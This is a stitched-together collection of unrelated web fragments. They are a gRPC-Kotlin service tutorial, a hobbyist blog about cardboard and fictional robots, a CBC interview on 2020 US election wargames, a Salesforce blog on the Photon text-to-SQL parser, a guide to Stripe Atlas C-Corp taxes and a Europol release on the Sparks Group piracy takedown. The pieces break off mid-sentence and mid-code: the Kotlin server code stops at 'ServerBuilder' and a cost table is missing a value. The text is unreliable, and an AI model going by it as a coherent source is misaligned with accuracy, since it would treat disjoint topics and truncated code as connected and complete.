   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>return</span><span>s</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>This RPC call is implemented as a suspending method in our service.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

  <span>override</span> <span>suspend</span> <span>fun</span> <span>getVenue</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Venue</span> <span>{</span>
        <span>return</span> <span>db</span><span>.</span><span>getVenue</span><span>(</span><span>request</span><span>)</span>
    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We could add logic to query a database to get a venue based on a location. The suspending method above returns a <code>Venue</code>. In our protocol buffer file, we had defined this as a message.</p>

<div><div><pre><code><span>message</span> <span>Venue</span> <span>{</span>
   <span>string</span> <span>name</span> <span>=</span> <span>1</span><span>;</span>
   <span>Location</span> <span>location</span> <span>=</span> <span>2</span><span>;</span>
   <span>VenueType</span> <span>venueType</span> <span>=</span> <span>3</span><span>;</span>

   <span>enum</span> <span>VenueType</span> <span>{</span>
     <span>Landmark</span> <span>=</span> <span>0</span><span>;</span>
     <span>Driving_Range</span> <span>=</span> <span>1</span><span>;</span>
     <span>Golf_Course</span> <span>=</span> <span>2</span><span>;</span>
     <span>Restaurant</span> <span>=</span> <span>3</span><span>;</span>
     <span>Retail</span> <span>=</span> <span>4</span><span>;</span>
   <span>}</span>

   <span>int64</span> <span>checkins</span> <span>=</span> <span>4</span><span>;</span>
   <span>int64</span> <span>reviews</span> <span>=</span> <span>5</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The protocol buffer compiler creates a builder for the <code>Venue</code> message. It has setters for each field defined above. We could map to this type using its builder.</p>

<div><div><pre><code><span>Venue</span><span>.</span><span>newBuilder</span><span>()</span>
  <span>.</span><span>setName</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setLocation</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setVenueType</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setCheckins</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setReviews</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>build</span><span>()</span>
</code></pre></div></div>

<h4 id="server-streaming-1">Server Streaming</h4>

<div><div><pre><code><span>rpc</span> <span>listVenues</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Venue</span><span>)</span> <span>{</span> <span>}</span>
</code></pre></div></div>

<p>A server streaming RPC call was defined using the <code>listVenues</code> method that returns a stream of venues. This translates into method that returns a <a href="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.flow/-flow/">Flow</a> of <code>Venue</code>.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

  <span>override</span> <span>fun</span> <span>listVenues</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Flow</span><span>&lt;</span><span>Venue</span><span>&gt;</span> <span>{</span>
      <span>return</span> <span>db</span><span>.</span><span>getVenues</span><span>(</span><span>request</span><span>).</span><span>asFlow</span><span>()</span>
  <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We might have logic to query our database to get a list of venues nearby. The list return could be transformed into a <code>Flow</code> using the <code>asFlow</code> extension.</p>

<h4 id="client-streaming-1">Client Streaming</h4>

<p>A client streaming RPC call is also mapped to a <code>Flow</code>. But, the parameter of the generated is a Flow of requests.</p>

<div><div><pre><code><span>rpc</span> <span>RecordTrip</span><span>(</span><span>stream</span> <span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>TripSummary</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<p>This RPC method is translated as follows.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

   <span>override</span> <span>suspend</span> <span>fun</span> <span>recordTrip</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Location</span><span>&gt;):</span> <span>TripSummary</span> <span>{</span>
        <span>..</span><span>.</span>
    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>In this generated method, the return type is a single message <code>TripSummary</code>. The request is a flow of locations.</p>

<h4 id="bidirectional-streaming-1">Bidirectional Streaming</h4>

<p>As we saw earlier, a bidirectional streaming call is a streaming responses and requests.</p>

<div><div><pre><code><span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

   <span>override</span> <span>fun</span> <span>chat</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;):</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;</span> <span>{</span>
        <span>..</span><span>.</span>
   <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>The chat RPC call translates to a method that takes a Flow of comments and returns a Flow of comments.</p>

<h3 id="config--start-grpc-server">Config &amp; Start gRPC Server</h3>

<p>We have implemented each RPC call. How do we configure and start our gRPC server? The gRPC-Kotlin library is built on top of <a href="https://github.com/grpc/grpc-java">gRPC-Java</a>. It provides a <a href="https://github.com/grpc/grpc-java/blob/master/api/src/main/java/io/grpc/ServerBuilder.java">builder</a> to get configure and start a gRPC server.</p>

<div><div><pre><code><span>val</span> <span>server</span> <span>=</span> <span>ServerBuilder</span>

<p>The other day I lopped off a sizeable chunk of my thumbprint while making a robot. The cut? It was one of those bright-red, swiftly-flowing ones, where you're pretty sure you're seeing bone or muscle or some other gross-thing-that-should-probably-stay-inside-your-body. The robot? It was made of cardboard and beer cans:</p>

<p>This little guy is one of many cardboard robots that I've made over the years. During summers, my sister and I would go to Vineland, New Jersey to stay with my aunt and cousins for a glorious week of catching frogs, playing Sega Genesis, eating spoonfuls of iced tea mix, and arts 'n' crafts.</p>
<p>For some reason, we'd always center on a unique theme each year for our arts 'n' crafts. One summer, it was <a href="https://www.charlieharrington.com/create-wonderful-things-be-good-have-fun">Klutz Press friendship bracelets</a>. Another was god's eyes - we made hundreds. Our proudest summer craft of them all? A "working" cardboard R2-D2. If not for a late '90s winter basement flood, Cardboard Artoo would still be with us today.</p>
<p>I decided to try my hand at making another cardboard robot because I've been thinking a lot about them. Mostly because I'm writing a children's novel about robots, but also cause it's summer and that's the sort of thing you do during summer.</p>
<p>There are all kinds of robots, cardboard and not. But there's a certain sort of robot that makes my gears turn. The rest of this post will review my favorite robots (and the kid who loves them).</p>
<h2>Robots I Love</h2>
<h3>R.O.B. (Robotic Operating Buddy)</h3>
<p>It's a robot... for your original Nintendo. I'm embarassed to admit it, but I've never seen a R.O.B. in real-life, despite scouring every local garage sale in New Jersey for years.</p>

<p>These Nintendo ads are just perfection. I'm still more excited for the promise of this system than any game console out today.</p>

<p>R.O.B. only ever worked with two Nintendo games. From what I've read, neither is very fun. But I'm sure there are some great ROM-hacks out there with more robotic operating buddy interactions.</p>
<h3>Johnny 5</h3>
<p>Duh.</p>
<p>Johnny 5 looks a lot like R.O.B., except with more nuclear-weapons. He loves reading, loves input, loves New York City. A loyal friend, and perhaps a bit too gullible for his own good.</p>

<p>It's probably becoming quite clear that I'm drawn to a rectangular face on a telescopic neck with tread-like wheels. That's just my type.</p>
<p>I also just discovered this video of someone's real-life Wall-E, and it's frightenly real-looking. Maybe this means I'll get to meet a Wall-E one day, hopefully not on a post-apocalyptic wasteland Earth.</p>

<h3>The flying robots from *Batteries Not Included</h3>
<p>I don't remember much about this movie, other than that my sister and I watched the recorded-from-TV VHS tape all the time, and there were these super cute baby flying robots who lived with a bunch of old people in an apartment building in New York City.</p>

<p>We got our 2-XL at a garage sale (garage sales were things of wonder to me as a child). Yes, we had the original 2-XL, the eight-track one. In fact, 2-XL was my first and only interaction with an eight-track system. In the early `90s, Tiger Electronics must have bought 2-XL, and they came out with a cassette-version. </p>

<p>Cozmo's fatal flaw is how nearly impossible it is to connect your phone to the robot's local wifi service, which is how you are forced to control and interact with Cozmo. The connection process is random, non-deterministic, and saps up most of the time you've allocated to play with Cozmo. Also, Cozmo's parent company recently went out of business, which is a huge bummer for the robot-toy industry.</p>
<p>That said, I've had a lot fun with Cozmo, including <a href="https://www.charlieharrington.com/teaching-my-robot-with-tensorflow">teaching him how to find my toothpaste with a TensorFlow computer vision model</a>.</p>

I could go through a whole list of them, cause I really do love them all (GNKs, Artoo, Threepio, IG-88, BB-8, those little mouse-like black boxes in the Death Star), but in a rare dose of restraint, here's my favorite Star Wars droid!</p>
<h4>WED-15-1016</h4>
<p>It's R.O.B. with a longer neck, a blue face, and way more creepy claw arms. You may remember this robot critter from its role in repairing the Millenium Falcon at Hoth Base in Empire Strikes Back. Or at least attempting to repair.</p>

<h2>More robots</h2>
<p>So, who did I miss in my list? Data? He's an android, so not exactly a robot. But possibly Mega Man X is an android, so maybe I'm already mixing things up.</p>
<p>Speaking of lists, I also found this gigantic <a href="https://en.wikipedia.org/wiki/List_of_fictional_robots_and_androids">list of fictional robots and androids</a> on Wikipedia.</p>
<p>I'm not-so-secretly hoping that, one day, the robots in my book will be added to this Wikipedia list. Yes, I could edit the Wikipedia page myself, but c'mon, that's not the goal here.</p>
<h2>From cardboard to ciruit boards</h2>
<p>Also, it's high time to upgrade my hobby. I've begun looking into basic robotics kits, and I'll hopefully be constructing some new robotic best friends very soon. Maybe not Maker-Faire worthy, but ya gotta start somewhere.</p></div></div>]]>

How many of them ended with a smooth transition of power?</strong></p>  <p>Well, none of them really ended up with what we would traditionally call a smooth transition of power. There were ways in which every one of the scenarios ended up being contested, but three of them ended pretty catastrophically, in the sense&nbsp;that the actual results of the election were contested right down to Inauguration Day, and protests and counter protests in the streets escalated to violence. So it was a pretty grim outcome.</p>  <p><strong>To develop these scenarios, you did wargaming? What is that?</strong></p>  <p>Well, wargaming is a methodology that's been used, as you can tell from the name, primarily by the military, but increasingly also in business contexts, and also by non-profits, as in this case, to explore — effectively the possibility space that you can get into when you're dealing with complex numbers of actors who are behaving in adversarial ways toward one another.</p>  <p>So it's a way of anticipating the dynamic interaction effects that can emerge when you have multiple sets of players, each competing for a prize of some sort.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/portland-protests.jpg 300w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/portland-protests.jpg 460w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/portland-protests.jpg 620w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/portland-protests.jpg 780w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/portland-protests.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/portland-protests.jpg"></p></div><figcaption>Police declared a riot around midnight Aug. 15, as Portland protests continued for the 80th consecutive night. One of the scenarios that played out in the wargames, held in June, was the deployment of National Guard to quell left-wing protests, a situation that has since come to pass.  <!-- --> <!-- -->(Dave Killen/The Oregonian via AP)</figcaption></figure></span></p>  <p><strong>How does it work? Do you say, "Well, what if this happens, what if that happens?"&nbsp;and each party has their own interests?</strong></p>  <p>What we did was we posed four different scenarios. We ran the war games four times [with] four different scenarios for the actual electoral outcome,&nbsp;and then in each case, we played out with teams that represented the Trump campaign, that represented the Biden campaign, that represented Democratic elected officials across the country, Republican elected officials across the country, the courts and the media.</p>  <p>So these were all played by teams of people who would simulate what they think those actors would do in a contested election scenario. It's meant to basically allow you to explore and understand what could happen, not what will happen. It's not a prediction. It's more an exploration of the possibilities of things that could take place.</p>  <p><strong>Why did you pick this tool to look at the possible outcomes of the 2020 U.S. elections? You could have brought everyone together just for a conversation.</strong></p>  <p>Originally, we were planning on doing that. And of course, COVID kind of interrupted our planning for this. And the funny thing is the reason why we use this particular methodology — we chose it back this methodology back in February — was partly because we were feeling as if people were complacent about the kinds of disruption risks that exist in the American political system.</p>  <p>And what's happened, of course, in the seven months since then, is we've had this giant pandemic. And I think that's woken people up to the fact that they need to take seriously [possible] long-tail, low-probability, high-impact events.&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/election-2020-postal-service.jpg 300w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/election-2020-postal-service.jpg 460w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/election-2020-postal-service.jpg 620w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/election-2020-postal-service.jpg 780w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/election-2020-postal-service.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/election-2020-postal-service.jpg"></p></div><figcaption>In this image from video, U.S. Postmaster General Louis DeJoy testifies during the Senate committee hearing on Friday.

So November 4 to January 20, that 10-and-a-half week period.&nbsp;But the thing I worry about most with respect to the way the president is currently discussing [and] tweeting about voting by mail, is he's in a sense pre-discrediting the vote and he's trying to sow a narrative with his fans that the only way he can lose is if there's a fraud of some sort. And that therefore that would suggest that they should, at minimum, not respect the next president, not respect a President Biden, not consider him to be a legitimate president and, more extremely, perhaps actually physically resist allowing him to take office should he win.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/usa-election-convention.JPG 300w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/usa-election-convention.JPG 460w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/usa-election-convention.JPG 620w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/usa-election-convention.JPG 780w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/usa-election-convention.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/usa-election-convention.JPG"></p></div><figcaption>This week, Joe Biden was officially named the Democratic Presidential nominee. <!-- --> <!-- -->(Kevin Lamarque/Reuters)</figcaption></figure></span></p>  <p>We don't know who's going to win, of course. We ran scenarios that explore the entire possibility space&nbsp;ranging from Donald Trump winning the electoral college clearly to a Biden&nbsp;landslide on the other hand, and looked at all sorts of different kinds of scenarios in between, and he's trying to pre-discredit the vote, so that when he loses — if he loses, he can claim he was either robbed of his rightful re-election and then possibly use that as an excuse to set up actually trying to prevent him from being forced from giving up the office.</p>  <p><strong>Nils, I have to say you sound deeply concerned. What do these outcomes tell you about the health of democracy in the United States right now?</strong></p>  <p>Well, obviously, it doesn't say anything very good about the health of the democracy. What I would say is this:&nbsp;when Donald Trump was elected in 2016, what I told everybody is&nbsp;it would be a test of the stability and quality of America's political institutions. And that was, I think, true. What I learned from these war-game processes is just how much of the institutional infrastructure of our democracy relies primarily on norms, rather than de facto or de jure rules.&nbsp;</p>  <p>The number of moves that an incumbent president who is uninhibited by norms and unrestrained by his own party can do, completely legally, is really quite disturbing.&nbsp;So, there can be things like invoking the insurrection act to bring out troops into the streets, calling for emergency powers that can invoke all sorts of things. These are powers that have existed legally within the constitutional order for a long time, and the only reason they haven't been used to disrupt elections in the past is because there were norms inhibiting incumbents from behaving that way. And those norms were enforced partly by their own party.</p>  <p>And so I think the question you have to ask is, when you look at this particular president, does he respect norms? And when you look at this particular political party that he leads, do we think that if he does choose to disrespect the norms, they will restrain him? I'll leave it to your listeners to decide what they think about that.</p>  <hr>  <p><em>Written and produced by Samraweet Yohannes. </em><em>Q&amp;A edited for length and clarity.</em></p></span></p></div></div>]]>

It organizes data using inter-linked tables consisting of columns (also called "fields" or "attributes") and rows (also called "records" or "tuples") (Figure 2). Generally, each table represents an entity type (e.g. <em>user</em> and <em>contact)</em>; each column represents an attribute of the entity type (<em>name</em> and <em>address</em>) and each row represents an instance. Some columns are <a href="https://en.wikipedia.org/wiki/Primary_key">primary keys</a>, used for uniquely identifying a row (e.g. <em>contact.account_name</em>), and some are <a href="https://en.wikipedia.org/wiki/Foreign_key">foreign keys</a>, used to reference a primary key in a different table (e.g. <em>boat.contact</em>). </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/prework_entity_diagram.jpg" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/prework_entity_diagram.jpg 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/prework_entity_diagram.jpg 1000w, https://blog.einstein.ai/content/images/2020/08/prework_entity_diagram.jpg 1004w" sizes="(min-width: 720px) 720px"><figcaption>Figure 2.

As of today, it is common for SQL queries to be embedded into software to provide a more accessible user interface (e.g. <a href="https://www.klipfolio.com/blog/create-sql-dashboard#:~:text=A%20SQL%20dashboard%20is%20an,SQL%20(Structured%20Query%20Language).">dashboards</a>).

</table><!--kg-card-end: html--><p>Following previous work [2,4], we design an encoder-decoder model that takes a natural language question and the target DB schema as input and synthesizes a SQL query as output. We represent the input question and the DB schema jointly as a tagged sequence (Figure 4), which is first encoded with <a href="https://arxiv.org/abs/1810.04805">BERT</a> and then a <a href="https://en.wikipedia.org/wiki/Bidirectional_recurrent_neural_networks">bi-directional LSTM</a>. We use the hidden representations corresponding to special tokens <code>[T]</code> and <code>[C]</code> in this encoding as the table and column representations, and infuse them with DB metadata features. The question portion of the encoding is further encoded with another Bi-LSTM, and we use its output as the start state of the decoder.</p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.38.02-PM.png 1733w" sizes="(min-width: 720px) 720px"><figcaption>Figure 4. Our joint question-schema encoder for cross-database semantic parsing.

At each decoding step, the decoder performs one of the three actions: generating a SQL keyword, copying a table/column, or copying a token from the input utterance, determined by a learned gating function.</p><p>We train the model on a popular cross-DB text-to-SQL dataset, <a href="https://yale-lily.github.io/spider">Spider</a> [4]. Combined with table value augmentation and static SQL correctness checking, our model achieves state-of-the-art structure matching accuracy on the Spider dev set. More details can be found in our <a href="https://arxiv.org/abs/2007.15280">research paper</a>. (We are continuously improving the semantic parser and updating the Photon backend.)</p><p><strong>Handling Untranslatable Utterances.</strong> While state-of-the-art cross-DB semantic parsers are able to handle a large set of common user requests, there is still ample space for improvement. Besides reducing errors made on questions that have a SQL translation, we also need to properly handle input utterances that cannot be mapped to a SQL statement, even by humans. </p><p>Practical NLIDBs are exposed to a wide range of noisy user input. Users tend to employ underspecified and incomplete NL expressions when interacting with such interfaces [6,8], and may ask for information that is not provided by the DB. For such input, learning-based semantic parsers can make unreliable guesses that may appear correct on the surface. This issue is especially severe for end-to-end neural semantic parsers when the noisy input appears similar to a valid input in the embedding space. </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1644w" sizes="(min-width: 720px) 720px"><figcaption>Figure 5. Types of Untranslatable Input Utterances to an NLIDB</figcaption></figure><p>Photon implements a module that automatically detects untranslatable input utterances and highlights the ambiguous spans in order to help users rephrase the utterance. To this end, we perturb the Spider dataset to automatically synthesize a large number of untranslatable utterances corresponding to the categories in Figure 5. Our perturbation method yields not only untranslatable questions but also the exact span that causes it to be untranslatable. With this new data, we train a neural translatability detector by extracting confusion spans from the input utterance. If a confusion span is detected, we deem the question untranslatable and prompt the user to rephrase. If the model detects that a confusion span likely refers to a field, we run a language model perplexity check to identify the possible target field and suggest it to the user. More details can be found in our <a href="https://arxiv.org/abs/2007.15280">research paper</a>. </p><p><strong>Dual-Input Mode. </strong>Photon accepts both natural language questions and well-formed SQL queries as input. It automatically detects the input type and executes the input immediately if it is a valid SQL query. We expect that under certain cases, forming a natural language question can be difficult and writing SQL directly may save time, especially for users proficient in SQL. </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 2152w" sizes="(min-width: 720px) 720px"><figcaption>Figure 6.

Below we summarize some suggestions and concerns, which may benefit future development of the community.</p><p><strong>Trust and Reliability. </strong>Deep learning based semantic parsers act as black boxes and their predictions lack interpretability. Moreover, it is difficult for end users to detect mistakes made by the parser when the output is executable and yields results of the same type as the correct interpretation (e.g. <em>flights arriving in SFO </em>vs. <em>flights departing from SFO</em>). Some developers have expressed reluctance to trusting the system output, highlighting the necessity of better explanation for both the generated queries and the process of deriving them. </p><p><strong>Self-control. </strong>Some users …</p></div></div></section></div>

      <section>
        <p><em>Disclaimer: this blog post doesn’t constitute accounting advice. When in doubt, talk to a lawyer/accountant and all that jazz.</em></p>

<h2 id="background">Background</h2>

<p>I incorporated a C Corp in the State of Delaware via Stripe Atlas in February 2019. It was my first time dealing with the tax system in the US, as I’ve never been or operated a business there.</p>

<p>Taxes must be one of the scariest aspects precluding folks from going into a business. Below is an account of how I <del>struggled</del> dealt with my first tax season.</p>

<p>All usual disclaimers apply.</p>

<h2 id="why-a-c-corp-instead-of-an-llc">Why a C-Corp instead of an LLC?</h2>

<p>A single-member LLC (regarded as a pass-through entity by default) complicates tax situation for nonresident aliens - a term-of-art for non-US citizens &amp; residents (which is me).</p>

<p>While C Corps are more complex to run, their tax treatment is relatively straightforward: they’re only taxed on their profits. If you’re paying yourself a salary, you can expense that amount, which will lower your taxable income (assuming you’re not a US taxpayer. Otherwise, it gets complicated, fast).</p>

<p>If you’re a US citizen or a resident, LLC is more apt if you want to bootstrap your business.</p>

<p>At the time of writing, Stripe has restricted LLCs to US founders only. Presumably, some folks have shot themselves in feet too much that they decided to pull the plug.</p>

<h2 id="registered-agent">Registered agent</h2>

<p>Companies formed in the State of Delaware are required to keep a registered agent in the state. Think of it as an address state and federal agencies use to get ahold of you.</p>

<p>Somewhere around mid-January, you will receive an email from Stripe Atlas asking whether you want to renew the registered agent. If you don’t explicitly opt-out, they will automatically renew your registered agent subscription by the end of January.</p>

<p>Unfortunately, the registered agent that comes with Atlas can’t accept general mail (except for bank cards). Some virtual address providers (aka <abbr title="Commercial mail receiving agency">CMRA</abbr>) can act as your registered agent. That way, you can avoid the $100 fee for the default registered agent that comes with Atlas. To change the registered agent, you will have to complete a “Change of Address” form.</p>

<h2 id="delaware-franchise-tax">Delaware Franchise Tax</h2>

<p>While Delaware doesn’t have a sales tax, they do impose a <em>Franchise Tax</em> on registered businesses.</p>

<p>There are two ways to calculate the Franchise Tax: Authorized Shares Method and Assumed Par Value Capital Method. I won’t get into a <a href="https://corp.delaware.gov/frtaxcalc/">nitty-gritty</a>, but suffice it to say that you can use one that minimizes your tax liability.</p>

<p>A lot of folks running C Corps get stupendously high tax estimates amounting to tens or hundreds of thousands of dollars (causing a drama on the Stripe Atlas forum every time). It happens because the State of Delaware uses an Authorized Shares Method that results in higher tax bills. Once you switch to the Assumed Par Value Capital Method, your tax liability will (probably) drop to $450.</p>

<p>You don’t need an accountant to file an annual report, although the user interface is horrendous, to put it mildly.</p>

<p>One thing that I wish I’d known is that you can save on the Franchise Tax by authorizing 5000 shares (or less) instead of 10,000,000 shares, which is the Atlas’ default. That way, your tax due will be $225 ($175 minimum tax + $50 annual report filing fee) instead of $450. LLCs in Delaware pay a flat $300 tax.</p>

<h2 id="corporate-income-taxes">Corporate income taxes</h2>

<p>You pay corporate income taxes on the profit you make during the tax year. Even if you didn’t earn a single cent from the business, you still have to file a tax report by April 15th (you can ask the <abbr title="Internal Revenue Service">IRS</abbr> to extend the deadline).</p>

<p>Nothing precludes you from filing tax reports yourself. Unless you know what you’re doing, you will probably screw it up (terribly) and waste a lot of time that you otherwise can spend on running your business (tax reporting shouldn’t be <em>that</em> complex, but that’s a topic for another day). Stripe Atlas has partnered with two accounting firms offering tax preparation services at a discount.</p>

<p>Your accountant will ask you some questions and your balance sheet and an income (P&amp;L) statement for the previous financial year, so you will have to take care of the bookkeeping before talking to the accountant.</p>

<p>Because I’m a foreigner owning more than 25% of a US corporation, I have to file Form 5472 as well (in addition to Form 1120). The inaccurate filling or failure to file it usually carries a $25,000 fine. In that light, it’s better to pay an accountant and not worry about it.</p>

<p>Make sure you have an <abbr title="Electronic Federal Tax Payment System">EFTPS</abbr> pin code before the tax season. However, judging by the number of discussions on the Stripe Atlas forum, a lot of folks outside the US don’t receive that mail. To add an insult to the injury, they don’t give you the pin code over the phone. If you’re outside of the US, get yourself a mailing address in the US, and ask the IRS to mail you the EFTPS pin code.</p>

<h2 id="just-give-me-the-numbers">Just give me the numbers</h2>

  <thead>
    <tr>
      <th>Item</th>
      <th>Cost</th>
    </tr>

  <tbody>
    <tr>
      <td>Registered agent</td>

    </tr>
    <tr>
      <td>Accounting service (discounted)</td>
      <td>$250</td>
    </tr>
  </tbody>
</table>

<p>So with the default Stripe Atlas setup for C Corps, you’re looking at $800 for yearly maintenance at a minimum (without corporate income taxes). If you opt to use a default bank account provided by Atlas (SVB), add $300 on top of that ($25 x 12), unless you maintain an average balance of $25,000 per month.</p>

<p>If you plan to incorporate towards the end of the year, wait until January. That way, you can <em>skip</em> one tax year and spend time building a business instead of doing a soul-sucking administrative busywork.</p>

<p>The Sparks Group obtained DVDs and Blu-ray discs of unreleased content and compromised the copyright protections on the discs to reproduce and upload the content publically to online servers. It is believed that the piracy group, under investigation since September 2016, had successfully reproduced and disseminated hundreds of movies and TV programmes prior to their retail release date, including nearly every movie released by major production studios in the US. The Sparks Group has caused tens of millions of US dollars in losses to film production studios, mainly to the US movie, television, and supporting industries, from the copyright infringement.&nbsp;</p>
<h3>False claims for free films</h3>
<p>To get ahead, members of the Sparks Group made several material misrepresentations and omissions to wholesale distributors. On many occasions, they claimed to be DVD and Blu-ray discs retailers and promised not to sell the content prior to the retail release date. Once they received the products, the members of the group used special software to crack the copyright protections to then reproduce and encode the content in high-definition. The content was then disseminated and reproduced on streaming platforms, peer-to-peer and torrent networks from their platforms.&nbsp;</p>
<p>The servers were located around the world in Canada, Czechia, Denmark, France, Germany, Latvia, the Netherlands, Norway, Poland, Portugal, Romania, South Korea, Spain, Sweden, Switzerland, and the United Kingdom. These were taken down in yesterday’s action and in the days preceding it, with the help of national authorities from these countries. Other measures were also taken in Italy, Romania and Canada. One of the members of the alleged criminal network was arrested over the weekend in Cyprus and another suspect was arrested yesterday in the US. &nbsp;</p>
<h3>International cooperation</h3>
<p>This successful operation was possible thanks to the extensive international cooperation facilitated by Europol and Eurojust between law enforcement and judicial authorities from the countries involved. Europol enhanced the exchange of information through the participating countries and coordinated the action day with Eurojust which hosted yesterday’s a coordination centre, ensuring real-time coordination in the joint action of the national authorities in all the countries. An operational meeting at Europol and a coordination meeting at Eurojust were organised prior to the joint action day, facilitating the exchange of information between law enforcement and judicial authorities and setting a joint strategy between all the parties involved. Europol provided analytical support during the investigation and supported the information exchange between the involved police authorities via the SIENA secure communication system.</p>

